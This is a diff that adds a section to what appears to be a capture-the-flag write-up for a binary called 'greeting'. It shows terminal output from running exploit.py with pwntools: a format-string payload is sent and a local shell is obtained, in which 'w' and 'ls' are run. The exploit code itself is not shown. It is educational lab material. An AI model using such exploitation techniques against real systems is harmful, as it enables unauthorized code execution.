@@ -356,3 +356,26 @@ target.interactive()
 ```
 
 With that exploit, we get shell!
+
+```
+$   ython3 exploit.py 
+[!] Could not find executable 'greeting' in $PATH, using './greeting' instead
+[+] Starting local process './greeting': pid 60336
+[*] running in new terminal: ['/usr/bin/gdb', '-q', './greeting', '60336', '-x', '/tmp/pwnmn_pac9x.gdb']
+[+] Waiting for debugger: Done
+len: 59
+[*] Switching to interactive mode
+Hello, I'm nao!
+Please tell me your name... Nice to meet you, xx4\x99\x046\x99\x04T\x9a\x04V\x9a\x04                                                                                                                                                                                                                                                                                                              
+
+. . .
+
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       0 :)
+$ w
+ 19:13:07 up 2 days,  1:32,  1 user,  load average: 0.21, 0.13, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+guyinatu :0       :0               21Aug22 ?xdm?   1:02m  0.03s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu /usr/bin/gnome-session --systemd --session=ubuntu
+$ ls
+exploit.py  greeting  readme.md
+$  
+```
